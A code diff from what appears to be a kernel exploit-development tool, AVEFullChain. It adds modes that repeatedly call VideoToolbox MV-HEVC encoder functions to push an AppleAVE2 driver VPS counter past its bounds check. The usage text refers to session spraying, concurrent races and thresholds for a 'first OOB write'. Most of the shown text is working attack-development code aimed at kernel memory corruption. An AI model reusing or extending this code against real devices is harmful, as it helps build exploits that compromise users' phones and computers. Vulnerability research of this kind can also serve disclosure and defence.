@@ -2869,6 +2869,250 @@ cleanup_dummies:
         else
             rlog("No cross-session state detected. Sessions appear fully isolated.\n");
 
+    } else if (strcmp(mode, "prepare_spam") == 0) {
+        /*
+         * HYPOTHESIS: PrepareToEncodeFrames calls a SEPARATE external method
+         * (selector ~7) on AppleAVE2 than EncodeFrame (selector ~6).
+         * If PrepareToEncodeFrames touches VPS tables without the counter
+         * reset that EncodeFrame performs, repeated calls may accumulate
+         * the counter past the bounds check.
+         *
+         * Test: Create session, call PrepareToEncodeFrames N times without
+         * encoding, then encode once and check pset output for anomalies.
+         */
+        int prepare_count = (argc > 2) ? atoi(argv[2]) : 50;
+        if (prepare_count < 1) prepare_count = 50;
+        if (prepare_count > 500) prepare_count = 500;
+
+        rlog("=== PREPARE_SPAM: %d PrepareToEncodeFrames calls ===\n", prepare_count);
+        rlog("Hypothesis: PrepareToEncodeFrames may increment VPS counter\n");
+        rlog("without the reset that EncodeFrame triggers.\n\n");
+
+        /* Create encoder WITHOUT calling PrepareToEncodeFrames
+         * (we'll call it manually in the loop) */
+        int w = 1920, h = 1080;
+        VTCompressionSessionRef s = NULL;
+        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(enc_spec, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder,
+            kCFBooleanTrue);
+
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+        CFRelease(enc_spec);
+        CFRelease(wn); CFRelease(hn);
+
+        if (st != noErr || !s) {
+            rlog("FAILED to create encoder: %d\n", (int)st);
+            goto done;
+        }
+
+        /* Set MV-HEVC properties */
+        CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
+        CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &(int){1});
+        CFTypeRef layerIDs[] = { n0, n1 };
+        CFArrayRef layerArr = CFArrayCreate(NULL, layerIDs, 2, &kCFTypeArrayCallBacks);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layerArr);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCViewIDs, layerArr);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, layerArr);
+        CFRelease(layerArr);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
+        uint32_t baseline = 64000;
+        CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
+        CFRelease(bl);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_ProfileLevel,
+            kVTProfileLevel_HEVC_Main10_AutoLevel);
+        CFRelease(n0); CFRelease(n1);
+
+        /* Phase 1: Spam PrepareToEncodeFrames */
+        rlog("Phase 1: Calling PrepareToEncodeFrames %d times...\n", prepare_count);
+        int prepare_ok = 0, prepare_fail = 0;
+        for (int i = 0; i < prepare_count; i++) {
+            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (pr == noErr) {
+                prepare_ok++;
+            } else {
+                prepare_fail++;
+                rlog("  Prepare[%d] FAILED: %d\n", i, (int)pr);
+                if (prepare_fail >= 5) {
+                    rlog("  Too many failures, stopping prepare loop\n");
+                    break;
+                }
+            }
+        }
+        rlog("PrepareToEncodeFrames: %d ok, %d fail\n\n", prepare_ok, prepare_fail);
+
+        /* Phase 2: Now encode ONE frame and check pset output */
+        rlog("Phase 2: Encoding single frame after prepare spam...\n");
+        int enc_st = encode_one_stereo_kf(s, 0, w, h, 1, 1);
+        rlog("Encode result: %d\n", enc_st);
+        rlog("Pset count: %zu, bytes: %zu\n", g_last_pset_count, g_last_pset_total_bytes);
+
+        if ((int)g_last_pset_count > 4) {
+            rlog("*** ANOMALY: pset_count > 4 after prepare spam! ***\n");
+            rlog("*** PrepareToEncodeFrames MAY increment VPS counter! ***\n");
+        }
+
+        /* Phase 3: Encode more frames to get baseline comparison */
+        rlog("\nPhase 3: Encoding 5 more frames for baseline comparison...\n");
+        for (int i = 1; i <= 5; i++) {
+            enc_st = encode_one_stereo_kf(s, i, w, h, 1, 1);
+            rlog("  Frame %d: pset_count=%zu bytes=%zu\n",
+                 i, g_last_pset_count, g_last_pset_total_bytes);
+        }
+
+        /* Phase 4: Create fresh session, encode without prepare spam,
+         * compare output */
+        rlog("\nPhase 4: Control — fresh session, no prepare spam...\n");
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        s = create_mvhevc_encoder(w, h, 1);
+        if (s) {
+            enc_st = encode_one_stereo_kf(s, 0, w, h, 1, 1);
+            rlog("Control pset count: %zu, bytes: %zu\n",
+                 g_last_pset_count, g_last_pset_total_bytes);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        rlog("\n=== PREPARE_SPAM complete ===\n");
+
+    } else if (strcmp(mode, "property_cycle") == 0) {
+        /*
+         * HYPOTHESIS: Changing session properties between encodes may trigger
+         * SetSessionSettings (selector 6) on the kernel side, which could
+         * modify VPS tables independently of the encode path.
+         *
+         * Test: Alternate between different MV-HEVC configurations between
+         * encode calls to see if the VPS output changes unexpectedly.
+         */
+        int cycles = (argc > 2) ? atoi(argv[2]) : 20;
+        if (cycles < 1) cycles = 20;
+        if (cycles > 100) cycles = 100;
+
+        rlog("=== PROPERTY_CYCLE: %d cycles of property changes ===\n", cycles);
+        rlog("Hypothesis: SetSessionSettings may modify VPS tables\n");
+        rlog("independently of EncodeFrame path.\n\n");
+
+        int w = 1920, h = 1080;
+
+        /* Track pset outputs across cycles */
+        size_t last_count = 0, last_bytes = 0;
+        int anomalies = 0;
+
+        for (int c = 0; c < cycles; c++) {
+            VTCompressionSessionRef s = create_mvhevc_encoder(w, h, 1);
+            if (!s) {
+                rlog("Cycle %d: failed to create encoder\n", c);
+                continue;
+            }
+
+            /* Encode baseline frame */
+            encode_one_stereo_kf(s, 0, w, h, 1, 1);
+            size_t base_count = g_last_pset_count;
+            size_t base_bytes = g_last_pset_total_bytes;
+
+            /* Change properties between encodes */
+            for (int p = 0; p < 5; p++) {
+                /* Toggle stereo baseline to trigger SetSessionSettings */
+                uint32_t new_baseline = 64000 + (p * 1000);
+                CFNumberRef nbl = CFNumberCreate(NULL, kCFNumberSInt32Type, &new_baseline);
+                VTSessionSetProperty(s, kVTCompressionPropertyKey_StereoCameraBaseline, nbl);
+                CFRelease(nbl);
+
+                /* Re-prepare after property change */
+                VTCompressionSessionPrepareToEncodeFrames(s);
+
+                /* Encode and check */
+                encode_one_stereo_kf(s, p + 1, w, h, 1, 1);
+
+                if (g_last_pset_count != base_count ||
+                    g_last_pset_total_bytes != base_bytes) {
+                    rlog("Cycle %d prop %d: count=%zu→%zu bytes=%zu→%zu\n",
+                         c, p, base_count, g_last_pset_count,
+                         base_bytes, g_last_pset_total_bytes);
+                    if (g_last_pset_count > base_count) {
+                        anomalies++;
+                        rlog("*** PSET COUNT INCREASED after property change! ***\n");
+                    }
+                }
+            }
+
+            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+        }
+
+        rlog("\nProperty cycle complete: %d anomalies in %d cycles\n",
+             anomalies, cycles);
+        if (anomalies > 0)
+            rlog("*** SetSessionSettings MAY affect VPS tables! ***\n");
+        else
+            rlog("No property-change-induced anomalies detected.\n");
+
+    } else if (strcmp(mode, "interleave_prepare") == 0) {
+        /*
+         * HYPOTHESIS: Interleaving PrepareToEncodeFrames calls BETWEEN
+         * encode calls on the same session may cause additional VPS table
+         * entries if the kernel PrepareToEncodeFrames path writes to the
+         * table without resetting the counter.
+         *
+         * Test: encode, prepare N times, encode again — compare pset
+         * output of second encode to a control without prepare calls.
+         */
+        int prepare_between = (argc > 2) ? atoi(argv[2]) : 10;
+        int total_encodes = (argc > 3) ? atoi(argv[3]) : 20;
+        if (prepare_between < 1) prepare_between = 10;
+        if (total_encodes < 2) total_encodes = 20;
+
+        rlog("=== INTERLEAVE_PREPARE: %d prepares between each of %d encodes ===\n",
+             prepare_between, total_encodes);
+
+        int w = 1920, h = 1080;
+
+        /* Test session: prepare spam between encodes */
+        VTCompressionSessionRef s_test = create_mvhevc_encoder(w, h, 1);
+        if (!s_test) { rlog("Failed to create test session\n"); goto done; }
+
+        rlog("\n--- Test session (with prepare spam) ---\n");
+        for (int e = 0; e < total_encodes; e++) {
+            /* Spam PrepareToEncodeFrames between encodes */
+            if (e > 0) {
+                for (int p = 0; p < prepare_between; p++)
+                    VTCompressionSessionPrepareToEncodeFrames(s_test);
+            }
+            encode_one_stereo_kf(s_test, e, w, h, 1, 1);
+            rlog("  Enc[%d]: pset_count=%zu bytes=%zu\n",
+                 e, g_last_pset_count, g_last_pset_total_bytes);
+        }
+        VTCompressionSessionCompleteFrames(s_test, kCMTimeInvalid);
+        VTCompressionSessionInvalidate(s_test);
+        CFRelease(s_test);
+
+        /* Control session: no prepare spam between encodes */
+        VTCompressionSessionRef s_ctrl = create_mvhevc_encoder(w, h, 1);
+        if (!s_ctrl) { rlog("Failed to create control session\n"); goto done; }
+
+        rlog("\n--- Control session (no prepare spam) ---\n");
+        for (int e = 0; e < total_encodes; e++) {
+            encode_one_stereo_kf(s_ctrl, e, w, h, 1, 1);
+            rlog("  Enc[%d]: pset_count=%zu bytes=%zu\n",
+                 e, g_last_pset_count, g_last_pset_total_bytes);
+        }
+        VTCompressionSessionCompleteFrames(s_ctrl, kCMTimeInvalid);
+        VTCompressionSessionInvalidate(s_ctrl);
+        CFRelease(s_ctrl);
+
+        rlog("\n=== INTERLEAVE_PREPARE complete ===\n");
+        rlog("Compare test vs control outputs above.\n");
+        rlog("If test shows higher pset counts, PrepareToEncodeFrames\n");
+        rlog("writes to VPS tables in kernel independently of encode.\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -2897,6 +3141,9 @@ cleanup_dummies:
         rlog("  concurrent_race [threads] [enc] -- Race concurrent encoder sessions (2-8 threads)\n");
         rlog("  rapid_reuse [rounds]       -- Rapid create/encode/destroy for stale state\n");
         rlog("  multi_session_spray [n] [enc] -- Create N sessions, encode round-robin\n");
+        rlog("  prepare_spam [count]   -- Spam PrepareToEncodeFrames without encoding\n");
+        rlog("  property_cycle [cycles] -- Change properties between encodes to trigger SetSessionSettings\n");
+        rlog("  interleave_prepare [prep] [enc] -- Interleave PrepareToEncodeFrames between encodes\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
